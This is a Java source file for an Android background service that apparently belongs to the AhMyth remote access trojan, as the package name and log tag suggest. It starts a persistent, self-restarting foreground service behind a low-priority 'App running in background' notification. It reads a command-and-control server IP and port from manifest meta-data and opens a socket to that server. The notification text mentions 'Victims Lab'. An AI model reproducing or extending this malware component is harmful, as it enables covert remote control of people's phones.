package ahmyth.mine.king.ahmyth;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.text.TextUtils;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;
import android.util.Log;

public class MainService extends Service {
    // Usamos el tag "AhMyth" para todos los logs del servicio
    private static final String TAG = "AhMyth";
    private static Context appContext;

    /**
     * Arranca el servicio en primer plano apropiadamente según la versión de Android.
     */
    public static void startService(Context context) {
        Intent intent = new Intent(context.getApplicationContext(), MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.getApplicationContext().startForegroundService(intent);
        } else {
            context.getApplicationContext().startService(intent);
        }
    }

    /**
     * Permite a otras clases obtener el contexto de la aplicación.
     */
    public static Context getContextOfApplication() {
        return appContext;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        appContext = getApplicationContext();
        Log.i(TAG, "Service created");
    }

    @Override
    public IBinder onBind(Intent intent) {
        // No se usa binding en este servicio
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "onStartCommand");
        // Iniciamos en primer plano con notificación válida
        startForegroundIfNeeded();

        // Inicializamos la conexión de socket
        initSocket();

        // En caso de ser detenido por el sistema, reiniciar
        return START_STICKY;
    }

    /**
     * Selecciona el método de foreground según versión de Android.
     */
    private void startForegroundIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundNotification();
        } else {
            Notification notification = new NotificationCompat.Builder(this)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle("App running in background")
                .setContentText("Conectando con Victims Lab…")
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
            startForeground(1, notification);
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startForegroundNotification() {
        String channelId = "com.play.service.techno";
        String channelName = "My Background Service";
        NotificationChannel chan = new NotificationChannel(
            channelId,
            channelName,
            NotificationManager.IMPORTANCE_LOW
        );
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        NotificationManager mgr = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        mgr.createNotificationChannel(chan);

        Notification notification = new NotificationCompat.Builder(this, channelId)
            .setOngoing(true)
            .setContentTitle("App running in background")
            .setContentText("Conectando con Victims Lab…")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build();

        startForeground(1, notification);
    }

    /**
     * Lee la IP y el puerto desde los <meta-data> del AndroidManifest y conecta el socket.
     */
    private void initSocket() {
        Log.i(TAG, "Initializing socket connection");

        String serverIp = null;
        String serverPort = null;

        // 1) Extraemos el Bundle de meta-data
        try {
            ApplicationInfo ai = getPackageManager().getApplicationInfo(
                getPackageName(),
                PackageManager.GET_META_DATA
            );
            Bundle meta = ai.metaData;
            if (meta != null) {
                // 2) Obtenemos como Object y convertimos a String
                Object ipObj   = meta.get("SERVER_IP");
                Object portObj = meta.get("SERVER_PORT");
                serverIp   = (ipObj   != null ? ipObj.toString()   : null);
                serverPort = (portObj != null ? portObj.toString() : null);

                // 3) Log intermedio para ver qué valores hemos leído
                Log.i(TAG, "Meta-data read: SERVER_IP=" + serverIp
                           + " SERVER_PORT=" + serverPort);
            }
        } catch (PackageManager.NameNotFoundException e) {
            Log.e(TAG, "Error reading meta-data", e);
        }

        // 4) Validamos que no sean vacíos
        if (TextUtils.isEmpty(serverIp) || TextUtils.isEmpty(serverPort)) {
            Log.e(TAG, "Missing SERVER_IP or SERVER_PORT in manifest meta-data");
            return;
        }

        // 5) Parse y conexión
        try {
            int port = Integer.parseInt(serverPort);
            Log.i(TAG, "Connecting to " + serverIp + ":" + port);
            IOSocket.connect(serverIp, port);
        } catch (NumberFormatException e) {
            Log.e(TAG, "Invalid server port: " + serverPort, e);
        } catch (Exception e) {
            Log.e(TAG, "Socket connection failed", e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "Service destroyed, disconnecting socket");
        try {
            IOSocket.getInstance().disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Error disconnecting socket", e);
        }
    }
}